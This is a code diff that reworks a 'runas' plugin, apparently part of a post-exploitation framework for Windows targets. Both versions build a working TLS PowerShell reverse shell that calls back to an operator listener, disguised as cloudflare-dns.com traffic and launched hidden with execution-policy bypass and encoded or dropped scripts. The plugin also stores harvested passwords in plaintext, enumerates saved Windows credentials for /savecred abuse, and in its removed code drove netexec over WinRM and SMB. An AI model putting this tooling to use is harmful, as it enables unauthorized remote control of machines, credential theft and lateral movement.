@@ -1,263 +1,242 @@
 import argparse
+import base64
 import json
 import os
-import subprocess
 import sys
-import base64
-import shutil
-from typing import Optional, Dict, List, Tuple, Any
+import traceback
+from typing import Any, Dict, List, Optional
+
+from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
 from ..api import plugin, SessionContext
-from ..shared.common import format_runas_report
+from ..shared.common import format_generic_report
+from ..shared.runner import run_collector_plugin
 
 if sys.platform == 'win32':
     import winreg
 else:
     winreg = None
 
-RUNAS_USAGE = """
-runas — Execute commands as another user on Windows (local or remote).
+_PLUGIN_FILE = os.path.abspath(__file__)
+TOOL_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(_PLUGIN_FILE))))
+LOGS_DIR = os.path.join(TOOL_ROOT, "logs")
+CREDENTIALS_FILE = os.path.join(LOGS_DIR, "runas_creds.json")
 
-This plugin replicates the general functionality of the Windows runas utility.
-It supports running a command with alternate credentials, either on the local
-machine or on a remote host (via WinRM/SMB using netexec). It can also manage
-saved credentials for later reuse.
+
+RUNAS_USAGE = """
+runas — Run a command on the LOCAL target host under alternate credentials.
 
 Usage:
-  runas -u <username> [-p <password> | -sv | -wsv] -h <host> [-C <command>] [-rh <host> -rp <port>] [-d <domain>]
+  runas -u <user> (-p <pass> | -sv | -wsv) [-C <cmd>] [-rh <ip> -rp <port>] [-d <domain>]
   runas -eu
 
 Options:
-  -u, --username <user>      Username (required unless -eu is used)
-  -p, --password <pass>      Password (required unless -sv, -wsv, or -eu is used)
-  -h, --host <host>          Target host (localhost or remote IP/hostname). If omitted, localhost is assumed.
-  -C, --custom <command>     Custom command to execute instead of the reverse shell payload.
-                             The command is automatically backgrounded and does not require manual quoting.
-  -sv, --saved-cred          Use a credential saved in our own store (runas_creds.json).
-  -wsv, --windows-saved-cred Use Windows system saved credentials (/savecred) – only supported for localhost.
-  -eu, --enum-cred           Enumerate all saved credentials and exits (ignores all other arguments).
-  -rh, --callback-host <ip>  Listener IP for reverse shell (required unless -C is given).
-  -rp, --callback-port <port> Listener TLS port (required unless -C is given).
-  -d, --domain <domain>      Domain for the user (e.g., CONTOSO). If not given, the username is used as-is.
-
-Credential Storage:
-  Our own credentials are stored in <tool_root>/logs/runas_creds.json. When a command succeeds
-  with -p, the credential is automatically saved for that username. Use -sv to
-  reuse a saved credential without providing -p.
-
-  Using -wsv tells the plugin to rely on Windows Credential Manager (i.e., credentials
-  stored with 'cmdkey' or via the runas /savecred prompt). This works only on the
-  local machine.
-
-Remote Execution:
-  For remote hosts (non-localhost), this plugin requires the 'netexec' (nxc) tool
-  to be installed and in PATH. It tries WinRM first, then SMB. Remote execution
-  does NOT support -wsv.
-
-Local Execution:
-  For localhost, the command is run via PowerShell's Start-Process with the
-  supplied credentials (or via runas /savecred if -wsv is used), running in the
-  background.
-
-Default Payload:
-  If -C is not provided, a TLS reverse shell payload is generated and executed.
-  The payload connects back to the specified -rh/-rp listener.
-
-Examples:
-  # Run whoami on remote host as domain user
-  runas -u admin -p pass -d CONTOSO -h 192.168.1.10 -C "whoami"
-
-  # Launch reverse shell on localhost as domain user
-  runas -u backup -p secret -d MYDOM -h localhost -rh 10.0.0.5 -rp 4444
-
-  # Use our saved credential for domain user 'admin'
-  runas -u admin -sv -d CONTOSO -h 192.168.1.10 -C "ipconfig"
-
-  # Use Windows system saved credentials (local only)
-  runas -u domain\\user -wsv -h localhost -C "whoami"
-
-  # List saved credentials (our store only)
-  runas -eu
+  -u,  --username <user>       Alternate user (required unless -eu).
+  -p,  --password <pass>       Saved immediately to operator JSON (overwrites).
+  -sv, --saved-cred            Reuse password from logs/runas_creds.json.
+  -wsv,--windows-saved-cred    Use Windows Credential Manager on the TARGET.
+  -eu, --enum-cred             Enumerate credentials and exit.
+  -C,  --custom <command>      PowerShell command to run (default: reverse shell).
+  -rh, --callback-host <ip>    Listener IP for the default reverse shell.
+  -rp, --callback-port <port>  Listener port for the default reverse shell.
+  -d,  --domain <domain>       Domain to prepend to the username.
 """.strip()
 
 PLUGIN_INFO = RUNAS_USAGE
 
-TOOL_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-CREDENTIALS_FILE = os.path.join(TOOL_ROOT, "logs", "runas_creds.json")
+class _UsageRequested(Exception):
+    pass
 
-def _ensure_cred_dir():
-    os.makedirs(os.path.dirname(CREDENTIALS_FILE), exist_ok=True)
+
+class _ArgumentError(Exception):
+    pass
+
+
+class _ArgParser(argparse.ArgumentParser):
+    def error(self, message):
+        raise _ArgumentError(message)
+
+    def exit(self, status=0, message=None):
+        if status == 0:
+            raise _UsageRequested()
+        raise _ArgumentError(message or "argument error")
+
+def _ensure_logs_dir():
+    try:
+        os.makedirs(LOGS_DIR, exist_ok=True)
+    except Exception:
+        pass
+
 
 def _load_creds() -> Dict[str, str]:
-    _ensure_cred_dir()
+    _ensure_logs_dir()
     if os.path.exists(CREDENTIALS_FILE):
         try:
-            with open(CREDENTIALS_FILE, 'r') as f:
+            with open(CREDENTIALS_FILE, 'r', encoding='utf-8') as f:
                 return json.load(f)
         except Exception:
             return {}
     return {}
 
-def _save_creds(creds: Dict[str, str]):
-    _ensure_cred_dir()
-    with open(CREDENTIALS_FILE, 'w') as f:
-        json.dump(creds, f, indent=2)
 
-def _save_credential(username: str, password: str):
-    creds = _load_creds()
-    creds[username] = password
-    _save_creds(creds)
-
-def _get_credential(username: str) -> Optional[str]:
-    creds = _load_creds()
-    return creds.get(username)
-
-def _list_credentials() -> List[str]:
-    creds = _load_creds()
-    return list(creds.keys())
-
-def is_domain_joined() -> bool:
+def _save_credential(username: str, password: str) -> bool:
     try:
-        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
-                             r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters")
-        domain, _ = winreg.QueryValueEx(key, "Domain")
-        winreg.CloseKey(key)
-        return bool(domain and domain.strip())
-    except FileNotFoundError:
-        return False
+        _ensure_logs_dir()
+        creds = _load_creds()
+        creds[username] = password
+        with open(CREDENTIALS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(creds, f, indent=2)
+        return True
     except Exception:
         return False
 
-def generate_windows_payload(callback_host: str, callback_port: int) -> str:
-    ps_script = (
-        f"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{callback_host}', {callback_port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{$SslStream.Close();exit}}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"
-    )
-    encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
-    return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Start-Process -WindowStyle Hidden -NoNewWindow -FilePath powershell -ArgumentList \'-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}\'"'
 
-def execute_local_with_password(username: str, password: str, command: str) -> Tuple[bool, str]:
-    escaped_cmd = command.replace("'", "''")
-    ps_command = (
-        f"$secpass = ConvertTo-SecureString '{password}' -AsPlainText -Force; "
-        f"$cred = New-Object System.Management.Automation.PSCredential ('{username}', $secpass); "
-        f"Start-Process -FilePath 'cmd.exe' -ArgumentList '/c {escaped_cmd}' -Credential $cred -WindowStyle Hidden -NoNewWindow"
-    )
-    try:
-        subprocess.Popen(
-            ["powershell", "-Command", ps_command],
-            shell=False,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-        return True, "Command started in background"
-    except Exception as e:
-        return False, str(e)
-
-def execute_local_with_windows_saved_cred(username: str, command: str) -> Tuple[bool, str]:
-    runas_cmd = f'runas /savecred /user:{username} "cmd /c {command}"'
-    try:
-        subprocess.Popen(
-            runas_cmd,
-            shell=True,
-            creationflags=0x08000000,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-        return True, "Command started with Windows saved credentials (runas /savecred)"
-    except Exception as e:
-        return False, str(e)
-
-def _find_nxc() -> Optional[str]:
-    for cmd in ["netexec", "nxc"]:
-        path = shutil.which(cmd)
-        if path:
-            try:
-                subprocess.run([path, "--help"], capture_output=True, timeout=5, check=False)
-                return path
-            except Exception:
-                continue
+def _lookup_credential(username: str) -> Optional[str]:
+    c = _load_creds()
+    if username in c:
+        return c[username]
+    if "\\" in username:
+        bare = username.split("\\", 1)[1]
+        if bare in c:
+            return c[bare]
+    for k, v in c.items():
+        if "\\" in k and k.split("\\", 1)[1] == username:
+            return v
     return None
 
-def execute_remote(host: str, username: str, password: str, command: str, domain: Optional[str] = None) -> Tuple[bool, str]:
-    nxc_path = _find_nxc()
-    if not nxc_path:
-        return False, "netexec (nxc) is required for remote execution but could not be found or is not functional."
 
-    winrm_cmd = [nxc_path, "winrm", host, "-u", username, "-p", password]
-    if domain:
-        winrm_cmd.extend(["-d", domain])
-    winrm_cmd.extend(["-x", command])
+def _list_credentials() -> List[str]:
+    return list(_load_creds().keys())
 
-    smb_cmd = [nxc_path, "smb", host, "-u", username, "-p", password]
-    if domain:
-        smb_cmd.extend(["-d", domain])
-    smb_cmd.extend(["-x", command])
 
+def is_domain_joined() -> bool:
+    if winreg is None:
+        return False
     try:
-        proc = subprocess.run(winrm_cmd, capture_output=True, text=True, timeout=120)
-        if proc.returncode == 0:
-            return True, proc.stdout
-        winrm_err = proc.stderr.strip() or proc.stdout.strip()
-    except Exception as e:
-        winrm_err = str(e)
+        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                           r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters")
+        d, _ = winreg.QueryValueEx(k, "Domain")
+        winreg.CloseKey(k)
+        return bool(d and d.strip())
+    except Exception:
+        return False
 
-    try:
-        proc = subprocess.run(smb_cmd, capture_output=True, text=True, timeout=120)
-        if proc.returncode == 0:
-            return True, proc.stdout
-        smb_err = proc.stderr.strip() or proc.stdout.strip()
-        return False, f"WinRM failed: {winrm_err}\nSMB failed: {smb_err}"
-    except Exception as e:
-        return False, f"WinRM failed: {winrm_err}\nSMB exception: {str(e)}"
+def _ps_quote(s: str) -> str:
+    return (s or "").replace("'", "''")
 
-def execute_command(target_host: str, username: str, password: Optional[str],
-                    command: str, windows_saved_cred: bool = False,
-                    domain: Optional[str] = None) -> Tuple[bool, str]:
-    is_local = target_host is None or target_host.lower() in ("localhost", "127.0.0.1", "::1")
-    if windows_saved_cred:
-        if not is_local:
-            return False, "Windows saved credentials (-wsv) are only supported for localhost."
-        return execute_local_with_windows_saved_cred(username, command)
-    else:
-        if is_local:
-            return execute_local_with_password(username, password, command)
-        else:
-            return execute_remote(target_host, username, password, command, domain)
 
-def parse_runas_args(args: List[str]) -> Dict:
-    parser = argparse.ArgumentParser(
-        description="Run a command as another user (Windows only).",
-        add_help=False
+def _reverse_shell_ps(host: str, port: int) -> str:
+    return (
+        f"$a=New-Object Net.Sockets.TcpClient('{host}',{port});"
+        f"$b=New-Object Net.Security.SslStream($a.GetStream(),$false,({{$true}}));"
+        f"$b.AuthenticateAsClient('cloudflare-dns.com');"
+        f"$r=New-Object IO.StreamReader($b);"
+        f"$w=New-Object IO.StreamWriter($b);"
+        f"$w.AutoFlush=$true;"
+        f"$w.WriteLine('SHELL> ');"
+        f"while(($l=$r.ReadLine()) -ne $null){{"
+        f"$o=try{{Invoke-Expression $l 2>&1|Out-String}}catch{{$_|Out-String}};"
+        f"$w.WriteLine($o)}}"
     )
-    parser.add_argument('-u', '--username', help='Username')
-    parser.add_argument('-p', '--password', help='Password')
-    parser.add_argument('-H', '--host', help='Target host (localhost or remote)')
-    parser.add_argument('-C', '--custom', help='Custom command to execute')
-    parser.add_argument('-sv', '--saved-cred', action='store_true', help='Use our saved credential')
-    parser.add_argument('-wsv', '--windows-saved-cred', action='store_true', help='Use Windows system saved credentials (local only)')
-    parser.add_argument('-eu', '--enum-cred', action='store_true', help='Enumerate saved credentials')
-    parser.add_argument('-rh', '--callback-host', help='Listener IP for reverse shell')
-    parser.add_argument('-rp', '--callback-port', type=int, help='Listener port for reverse shell')
-    parser.add_argument('-d', '--domain', help='Domain for the user (e.g., CONTOSO)')
+
+def _build_password_spawn_script(user_for_spawn: str,
+                                 password: str,
+                                 inner_ps: str) -> str:
+    user_q = _ps_quote(user_for_spawn)
+    pw_q = _ps_quote(password or "")
+    inner_b64 = base64.b64encode(inner_ps.encode('utf-8')).decode('ascii')
+
+    template = (
+        "$s='%(S)s';$e='%(E)s';$k=0;$r=''\n"
+        "try{\n"
+        "$p=\"$env:Public\\r.ps1\"\n"
+        "[IO.File]::WriteAllText($p,"
+        "[Text.Encoding]::UTF8.GetString("
+        "[Convert]::FromBase64String('%(I)s')),[Text.Encoding]::UTF8)\n"
+        "$sec=ConvertTo-SecureString '%(P)s' -AsPlainText -Force\n"
+        "$cred=New-Object Management.Automation.PSCredential('%(U)s',$sec)\n"
+        "Start-Process powershell -Credential $cred -WindowStyle Hidden "
+        "-ArgumentList '-NoP','-NonI','-W','Hidden','-Exec','Bypass',"
+        "'-File',$p\n"
+        "$k=1;Start-Sleep 10;Remove-Item $p -Force -EA 0\n"
+        "}catch{$r=$_.Exception.Message}\n"
+        "$o=[ordered]@{ok=$k;err=$r}\n"
+        "Write-Output ($s+(ConvertTo-Json $o -Compress)+$e)\n"
+    ) % {
+        "S": PLUGIN_MARK_START,
+        "E": PLUGIN_MARK_END,
+        "U": user_q,
+        "P": pw_q,
+        "I": inner_b64,
+    }
+    return template
+
+
+def _build_savecred_script(user: str, inner_ps: str) -> str:
+    user_q = _ps_quote(user)
+    inner_b64 = base64.b64encode(inner_ps.encode('utf-16le')).decode('ascii')
+    template = (
+        "$s='%(S)s';$e='%(E)s';$k=0;$r=''\n"
+        "try{\n"
+        "$l='runas /savecred /user:%(U)s \"powershell "
+        "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand %(I)s\"'\n"
+        "Start-Process -WindowStyle Hidden cmd.exe -ArgumentList '/c',$l\n"
+        "$k=1\n"
+        "}catch{$r=$_.Exception.Message}\n"
+        "$o=[ordered]@{ok=$k;err=$r}\n"
+        "Write-Output ($s+(ConvertTo-Json $o -Compress)+$e)\n"
+    ) % {
+        "S": PLUGIN_MARK_START,
+        "E": PLUGIN_MARK_END,
+        "U": user_q,
+        "I": inner_b64,
+    }
+    return template
+
+def build_enum_script() -> str:
+    return (
+        "$ErrorActionPreference='SilentlyContinue'\n"
+        "$start='" + PLUGIN_MARK_START + "'; $end='" + PLUGIN_MARK_END + "'\n"
+        "$entries = @()\n"
+        "$current = $null\n"
+        "foreach ($l in (cmdkey /list 2>&1)) {\n"
+        "  $s = [string]$l\n"
+        "  if ($s -match '^\\s*Target:\\s*(.+?)\\s*$') {\n"
+        "    if ($null -ne $current) { $entries += $current }\n"
+        "    $current = [ordered]@{ target=$matches[1]; user=''; "
+        "type=''; savecred_usable=$false }\n"
+        "  } elseif ($null -ne $current -and $s -match '^\\s*User:\\s*(.+?)\\s*$') {\n"
+        "    $current.user = $matches[1]\n"
+        "  } elseif ($null -ne $current -and $s -match '^\\s*Type:\\s*(.+?)\\s*$') {\n"
+        "    $current.type = $matches[1]\n"
+        "    if ($current.target -like 'Domain:interactive=*') "
+        "{ $current.savecred_usable = $true }\n"
+        "  }\n"
+        "}\n"
+        "if ($null -ne $current) { $entries += $current }\n"
+        "$r = [ordered]@{ count=$entries.Count; credentials=$entries }\n"
+        "Write-Output ($start + (ConvertTo-Json $r -Depth 4 -Compress) + $end)\n"
+    )
+
+def parse_runas_args(args: List[str]) -> Dict[str, Any]:
+    parser = _ArgParser(add_help=False)
+    parser.add_argument('-u', '--username')
+    parser.add_argument('-p', '--password')
+    parser.add_argument('-C', '--custom')
+    parser.add_argument('-sv', '--saved-cred', action='store_true')
+    parser.add_argument('-wsv', '--windows-saved-cred', action='store_true')
+    parser.add_argument('-eu', '--enum-cred', action='store_true')
+    parser.add_argument('-rh', '--callback-host')
+    parser.add_argument('-rp', '--callback-port', type=int)
+    parser.add_argument('-d', '--domain')
     parser.add_argument('--help', action='store_true')
 
-    host_from_h = None
-    if '-h' in args:
-        idx = args.index('-h')
-        if idx + 1 < len(args) and not args[idx+1].startswith('-'):
-            host_from_h = args[idx+1]
+    try:
+        parsed, _ = parser.parse_known_args(args)
+    except _ArgumentError as e:
+        raise ValueError(str(e))
 
-    parsed, unknown = parser.parse_known_args(args)
-
-    if host_from_h is not None:
-        parsed.host = host_from_h
-    elif parsed.host is None and '-H' in args:
-        idx = args.index('-H')
-        if idx + 1 < len(args) and not args[idx+1].startswith('-'):
-            parsed.host = args[idx+1]
-
-    if parsed.help or (len(args) == 0) or (args[0] in ('-h', '--help') and len(args)==1):
-        parser.print_help()
-        sys.exit(0)
+    if parsed.help or len(args) == 0 or (args[0] in ('-h', '--help') and len(args) == 1):
+        raise _UsageRequested()
 
     if parsed.enum_cred:
         return {'enum_cred': True}
@@ -269,39 +248,45 @@ def parse_runas_args(args: List[str]) -> Dict:
     if parsed.domain:
         full_username = f"{parsed.domain}\\{parsed.username}"
 
-    cred_methods = sum([bool(parsed.password), parsed.saved_cred, parsed.windows_saved_cred])
-    if cred_methods == 0:
+    methods = sum([bool(parsed.password),
+                   bool(parsed.saved_cred),
+                   bool(parsed.windows_saved_cred)])
+    if methods == 0:
         raise ValueError("One of -p, -sv, or -wsv is required.")
-    if cred_methods > 1:
+    if methods > 1:
         raise ValueError("Only one of -p, -sv, or -wsv may be used.")
 
     if parsed.saved_cred:
-        pw = _get_credential(full_username)
+        pw = _lookup_credential(full_username)
         if pw is None:
-            raise ValueError(f"No saved credential found for user '{full_username}' in our store.")
+            raise ValueError(
+                f"No saved credential for '{full_username}' in "
+                f"{CREDENTIALS_FILE}. Run once with -p to populate it."
+            )
         parsed.password = pw
         parsed.windows_saved_cred = False
     elif parsed.windows_saved_cred:
         parsed.password = None
 
-    if parsed.host is None:
-        parsed.host = "localhost"
-
     if parsed.custom is None:
         if parsed.callback_host is None or parsed.callback_port is None:
             raise ValueError("When -C is not provided, both -rh and -rp are required.")
-    else:
-        parsed.callback_host = parsed.callback_host or "0.0.0.0"
-        parsed.callback_port = parsed.callback_port or 0
 
     parsed.full_username = full_username
     return vars(parsed)
 
-def run_plugin(session, args):
-    if sys.platform != 'win32':
-        session.print("This plugin is only supported on Windows systems.", 'red')
-        return 1
+def _print_plugin_store(session):
+    creds = _list_credentials()
+    session.print("", 'white')
+    session.print(f"Plugin credential store  ({CREDENTIALS_FILE})", 'cyan')
+    if not creds:
+        session.print("  (empty — populate with -p on any run)", 'yellow')
+    else:
+        for u in creds:
+            session.print(f"  [sv] {u}", 'white')
+        session.print("  [sv] = reusable with `runas -u <user> -sv`", 'yellow')
 
+def _run_plugin_inner(session: SessionContext, args: List[str]):
     if not args or any(a in ('-h', '--help') for a in args):
         session.print(RUNAS_USAGE)
         return 0
@@ -310,87 +295,102 @@ def run_plugin(session, args):
 
     try:
         params = parse_runas_args(args)
+    except _UsageRequested:
+        session.print(RUNAS_USAGE)
+        return 0
     except ValueError as e:
         session.print(f"Argument error: {e}", 'red')
         session.log_plugin_result('runas', '', 'argument_error')
         return 1
 
     if params.get('enum_cred'):
-        creds = _list_credentials()
-        if creds:
-            session.print("Saved credentials (our store):", 'cyan')
-            for username in creds:
-                session.print(f"  {username}", 'white')
-            session.log_plugin_result('runas', 'Enumerated saved credentials', 'success')
-        else:
-            session.print("No saved credentials found in our store.", 'yellow')
-            session.log_plugin_result('runas', 'No saved credentials', 'info')
-        return 0
+        def build_enum():
+            return build_enum_script()
+
+        rc = run_collector_plugin(
+            session, 'runas', None, build_enum, format_generic_report,
+            timeout=20.0,
+        )
+        _print_plugin_store(session)
+        session.log_plugin_result('runas', 'Enumerated credentials', 'success')
+        return rc
 
     username = params['full_username']
     password = params.get('password')
-    host = params['host']
     custom = params.get('custom')
     callback_host = params.get('callback_host')
     callback_port = params.get('callback_port')
-    windows_saved_cred = params.get('windows_saved_cred', False)
+    use_wsv = bool(params.get('windows_saved_cred'))
     domain = params.get('domain')
 
-    if domain and host.lower() in ("localhost", "127.0.0.1", "::1"):
-        if not is_domain_joined():
-            session.print("Error: This machine is not joined to a domain. Domain credentials cannot be used locally.", 'red')
-            session.log_plugin_result('runas', 'Domain credentials on non-domain machine', 'failure')
-            return 1
+    if domain and not is_domain_joined():
+        session.print(
+            "Error: This machine is not joined to a domain. "
+            "Domain credentials cannot be used.", 'red')
+        session.log_plugin_result('runas', 'Domain credentials on non-domain machine',
+                                  'failure')
+        return 1
+
+    if password and not use_wsv and not params.get('saved_cred'):
+        if _save_credential(username, password):
+            session.print(
+                f"Credential saved for {username} at {CREDENTIALS_FILE}.", 'green')
+        else:
+            session.print(
+                f"Warning: could not write {CREDENTIALS_FILE}.", 'yellow')
 
     if custom:
-        encoded = base64.b64encode(custom.encode('utf-16le')).decode()
-        command = f'powershell -Command "Start-Process -WindowStyle Hidden -FilePath powershell -ArgumentList \'-EncodedCommand {encoded}\'"'
-        command_display = custom
-        session.print(f"Executing custom command on {host} as {username}: {custom}", 'yellow')
+        inner_ps = custom
+        session.print(f"Executing on target as {username}: {custom}", 'yellow')
     else:
-        command = generate_windows_payload(callback_host, callback_port)
-        command_display = f"Reverse shell (TLS to {callback_host}:{callback_port})"
-        session.print(f"Generating reverse shell payload (TLS to {callback_host}:{callback_port})...", 'yellow')
-        session.print("Delivering payload in background...", 'yellow')
+        inner_ps = _reverse_shell_ps(callback_host, callback_port)
+        session.print(
+            f"Generating reverse shell payload "
+            f"(TLS to {callback_host}:{callback_port})...", 'yellow')
 
-    success, output = execute_command(
-        target_host=host,
-        username=username,
-        password=password,
-        command=command,
-        windows_saved_cred=windows_saved_cred,
-        domain=domain
+    if use_wsv:
+        script = _build_savecred_script(username, inner_ps)
+    else:
+        script = _build_password_spawn_script(username, password or "", inner_ps)
+
+    session.print(f"Script size: {len(script)} chars.", 'yellow')
+
+    def build_script():
+        return script
+
+    rc = run_collector_plugin(
+        session, 'runas', None, build_script, format_generic_report,
+        timeout=30.0,
     )
 
-    credential_saved = False
-    if success and not params.get('saved_cred') and not windows_saved_cred and password:
-        _save_credential(username, password)
-        credential_saved = True
-
-    result = {
-        'host': host,
-        'username': username,
-        'command_display': command_display,
-        'success': success,
-        'output': output if output else '',
-        'credential_saved': credential_saved,
-        'execution_method': 'local' if host.lower() in ("localhost", "127.0.0.1", "::1") else 'remote',
-    }
-
-    if success:
-        session.log_plugin_result('runas', f"Executed on {host} as {username}", 'success')
+    if rc == 0:
+        session.log_plugin_result('runas', f"Executed on target as {username}",
+                                  'success')
     else:
-        session.log_plugin_result('runas', f"Failed on {host} as {username}: {output}", 'failure')
+        session.log_plugin_result('runas', f"Failed on target as {username}",
+                                  'failure')
+    return rc
 
-    report = format_runas_report(result)
-    session.print(report, 'white')
+def run_plugin(session: SessionContext, args: List[str]):
+    try:
+        return _run_plugin_inner(session, args)
+    except SystemExit:
+        session.print("Plugin attempted to exit the process — suppressed.", 'red')
+        return 1
+    except BaseException:
+        session.print("Plugin crashed:\n" + traceback.format_exc(), 'red')
+        try:
+            session.log_plugin_result('runas', 'plugin crashed', 'failure')
+        except Exception:
+            pass
+        return 1
 
-    return 0 if success else 1
 
 @plugin.command(
     name='runas',
     platforms=['windows'],
-    description='Execute commands as another user (local or remote) with credential management.'
+    description="Run a local command under alternate credentials "
+                "(Windows runas equivalent).",
 )
-def runas(session, args):
+def runas(session: SessionContext, args: List[str]):
     return run_plugin(session, args)
